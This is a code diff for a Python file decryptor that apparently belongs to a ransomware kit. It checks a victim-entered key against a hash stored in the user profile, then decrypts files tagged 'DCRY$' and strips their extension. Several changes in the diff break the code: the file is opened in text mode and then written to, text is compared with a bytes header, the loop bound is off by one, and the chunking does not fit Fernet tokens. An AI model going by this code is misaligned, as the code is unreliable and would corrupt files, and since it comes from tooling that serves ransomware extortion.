@@ -30,7 +30,7 @@ try:
     print("\033[2J\033[H", end="")
     print(baner)
     print()
-    key = input("Enter a key: ").strip().encode()
+    key = bytes(input("Enter a key: ").strip().encode())
 except KeyboardInterrupt:
     exit(1)
 
@@ -40,7 +40,7 @@ def is_valid_key(key):
         key_file = os.path.join(os.environ["USERPROFILE"], "key")
         if not key or not os.path.exists(key_file):
             return False
-        with open(key_file, "rb") as f:
+        with open(key_file, "r") as f:
             return f.read() == hashlib.sha256(key).hexdigest()
     except:
         return False
@@ -71,20 +71,20 @@ def start_decryption():
 def decrypt_file(path, key, chunk_size=268435456):
     MAGIC = b"DCRY$"
     try:
-        with open(path, "r+b", buffering=-1) as f:
+        with open(path, "r", buffering=-1) as f:
             header = f.read(len(MAGIC))
             if header != MAGIC:
                 return
             file_size = os.path.getsize(path)
             cipher = Fernet(key=key)
-            for offset in range(len(MAGIC), file_size, chunk_size):
+            for offset in range(len(MAGIC), file_size + 1, chunk_size):
                 f.seek(offset)
                 chunk = f.read(chunk_size)
                 if not chunk:
                     break
-                encrypted_chunk = cipher.decrypt(chunk)
+                decrypted_chunk = cipher.decrypt(chunk)
                 f.seek(offset)
-                f.write(encrypted_chunk)
+                f.write(decrypted_chunk)
             f.seek(0)
         os.rename(path, os.path.splitext(path)[0])
     except InvalidToken:
